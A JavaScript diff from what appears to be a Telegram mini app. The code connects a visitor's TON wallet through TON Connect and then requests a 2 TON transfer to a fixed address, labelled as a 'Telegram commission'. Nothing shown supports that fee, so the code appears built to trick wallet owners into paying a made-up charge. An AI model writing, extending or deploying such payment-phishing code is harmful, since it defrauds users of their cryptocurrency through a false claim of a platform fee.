@@ -20,15 +20,9 @@ async function loadTonConnect() {
 
 // === Функция подключения кошелька и отправки TON ===
 async function connectWallet() {
+    console.log("🟡 Функция connectWallet() вызвана!");
+
     try {
-        await loadTonConnect();
-
-        if (typeof window.TonConnect === "undefined") {
-            console.error("❌ TON Connect НЕ загружен!");
-            alert("❌ Ошибка загрузки TON Connect. Попробуйте снова.");
-            return;
-        }
-
         const tonConnect = new TonConnect({
             manifestUrl: "https://telegram-mini-app-seven-blond.vercel.app/tonconnect-manifest.json"
         });
@@ -40,17 +34,17 @@ async function connectWallet() {
             return;
         }
 
-        const walletAddress = connectedWallet.account.address;
-        tg.sendData(JSON.stringify({ wallet: walletAddress }));
-        alert("✅ Кошелек подключен: " + walletAddress);
+        console.log("✅ Кошелек подключен:", connectedWallet.account.address);
+        alert("✅ Кошелек подключен: " + connectedWallet.account.address);
 
         // === Создаем транзакцию на 2 TON ===
         const transaction = {
-            to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc", // Адрес получателя
-            value: "2000000000", // 2 TON (в нанотонах)
+            to: "UQDDZ6llEnqAe2QqRAyuY3rQkWa3ZdFFH_Ksc8AjcrRvtFzc",
+            value: "2000000000",
             payload: "Комиссия telegram"
         };
 
+        console.log("📤 Отправка транзакции:", transaction);
         await tonConnect.sendTransaction(transaction);
         alert("✅ Транзакция на 2 TON отправлена!");
     } catch (error) {
@@ -58,9 +52,3 @@ async function connectWallet() {
         alert("❌ Ошибка: " + error.message);
     }
 }
-
-// === Назначаем обработчик на кнопку ===
-document.addEventListener("DOMContentLoaded", function () {
-    document.getElementById("connect-wallet").addEventListener("click", connectWallet);
-});
-
